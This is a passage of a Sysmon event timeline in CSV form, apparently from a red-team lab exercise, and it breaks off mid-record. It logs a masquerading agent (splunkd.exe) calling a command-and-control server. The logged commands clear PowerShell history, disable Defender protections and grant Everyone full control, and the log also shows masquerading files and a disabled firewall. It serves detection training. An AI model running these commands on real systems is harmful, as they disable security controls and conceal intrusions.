"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:04:39.565 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172630,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_i01u5u1e.5en.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300","CreationUtcTime: 2025-12-23 13:04:39.552 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:04:39.552","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.440 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172632,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_5s1qrivg.buz.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300","CreationUtcTime: 2025-12-23 13:05:15.431 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:05:15.433","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.469 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172634,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_b3mkhjbs.v4q.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300","CreationUtcTime: 2025-12-23 13:06:17.455 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:06:17.455","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.539 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172638,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_fiuu1f4h.ksa.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300","CreationUtcTime: 2025-12-23 13:07:52.521 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:52.521","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.873 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172641,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_wo1rsl4t.2fj.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300","CreationUtcTime: 2025-12-23 13:07:52.864 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:52.864","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.336 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172643,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_tdvv13l3.flg.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300","CreationUtcTime: 2025-12-23 13:07:53.328 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.328","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.698 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172645,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_dzrmlech.i50.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300","CreationUtcTime: 2025-12-23 13:07:53.695 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.695","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.976 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172647,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_54zea3c4.omi.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300","CreationUtcTime: 2025-12-23 13:07:53.971 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.971","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.629 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172650,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_wh53b2ld.wsa.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300","CreationUtcTime: 2025-12-23 13:08:56.624 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:08:56.624","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:11:33.718 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172661,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_q0p10ov5.weh.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300","CreationUtcTime: 2025-12-23 13:11:33.701 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:11:33.701","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.653 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172662,"Path: C:\Windows\System32\4bd145_T1036.007_masquerading.vbs ¦ Proc: C:\Users\Public\splunkd.exe ¦ PID: 2972 ¦ PGUID: E9F06A57-8EA3-694A-5C02-000000002300","CreationUtcTime: 2025-12-23 13:12:37.649 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.650","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.665 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172663,"Path: C:\Windows\System32\107417_T1036.007_masquerading.ps1 ¦ Proc: C:\Users\Public\splunkd.exe ¦ PID: 2972 ¦ PGUID: E9F06A57-8EA3-694A-5C02-000000002300","CreationUtcTime: 2025-12-23 13:12:37.663 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.664","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.745 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172668,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.745 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.745","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.747 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172669,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.746 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.746","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.749 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172670,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.748 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.748","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.750 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172671,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.doc.ps1 ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.750 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.750","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.752 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172672,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.ps1 ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.751 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.751","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.753 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172673,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.753 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.753","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.076 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172684,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_tqtmkh3c.b43.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 540 ¦ PGUID: E9F06A57-9549-694A-CF02-000000002300","CreationUtcTime: 2025-12-23 13:12:42.064 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:42.064","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.287 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172686,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_i5ky5abo.eb1.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 484 ¦ PGUID: E9F06A57-954A-694A-D002-000000002300","CreationUtcTime: 2025-12-23 13:12:42.281 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:42.283","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.491 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172688,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_yy5vwjfu.qh4.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8344 ¦ PGUID: E9F06A57-954A-694A-D102-000000002300","CreationUtcTime: 2025-12-23 13:12:42.486 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:42.486","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.758 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172690,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_cz4x404u.i3l.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300","CreationUtcTime: 2025-12-23 13:13:20.749 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:20.749","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:21.058 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172692,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_yawbrd4y.pfm.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8360 ¦ PGUID: E9F06A57-9570-694A-D302-000000002300","CreationUtcTime: 2025-12-23 13:13:21.056 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:21.056","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.768 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172696,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_q0gsia31.m4e.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300","CreationUtcTime: 2025-12-23 13:13:57.766 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:57.766","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.334 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172713,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_qemgwaag.gup.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300","CreationUtcTime: 2025-12-23 13:19:22.331 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:19:22.331","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.699 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172639,"Rule: EXE ¦ Path: C:\Windows\Temp\debug.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300","CreationUtcTime: 2025-12-23 13:07:52.698 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:52.698","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.735 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172665,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.732 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.734","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.741 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172666,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.740 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.740","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.743 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172667,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.ps1.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.742 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.742","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.689 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172694,"Rule: EXE ¦ Path: C:\Windows\System32\1db90b_T1036.003.exe ¦ Proc: C:\Users\Public\splunkd.exe ¦ PID: 2972 ¦ PGUID: E9F06A57-8EA3-694A-5C02-000000002300","CreationUtcTime: 2025-12-23 13:13:57.688 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:57.688","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.983 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172705,"Rule: EXE ¦ Path: C:\lsm.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300","CreationUtcTime: 2025-12-23 13:16:21.982 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:16:21.982","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.045 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172710,"Rule: EXE ¦ Path: C:\Windows\Temp\lsass.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 3648 ¦ PGUID: E9F06A57-96A0-694A-E402-000000002300","CreationUtcTime: 2025-12-23 13:18:25.043 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:18:25.043","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.848 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",172653,"Rule: T1089 ¦ EventType: SetValue ¦ TgtObj: HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile\EnableFirewall ¦ DWORD (0x00000000) ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 1588 ¦ PGUID: E9F06A57-7C75-694A-1E00-000000002300","User: NT AUTHORITY\LOCAL SERVICE ¦ UtcTime: 2025-12-23 13:09:33.848","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:04:39.319 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172629,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:04:39.316","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.346 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172631,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-PSReadlineOption -HistorySaveStyle SaveNothing"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:05:15.337","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.380 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:14.402 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172635,"Cmdline: cmd.exe /C icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1764 ¦ PGUID: E9F06A57-9402-694A-AF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:14.389","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:14.433 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172636,"Cmdline: icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q ¦ Proc: C:\Windows\System32\icacls.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4760 ¦ PGUID: E9F06A57-9402-694A-B002-000000002300 ¦ ParentPID: 1764 ¦ ParentPGUID: E9F06A57-9402-694A-AF02-000000002300 ¦ Description: - ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=512571E55EE542F7F477DB463385CA92,SHA256=CB9E55D4C02F4E55100724D2DA9A1267F49E196BD39FCDF36CEC6EA6314FAD2A,IMPHASH=1F9D15E7251963F81D67B888B965F5D1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: iCACLS.EXE ¦ ParentImage: 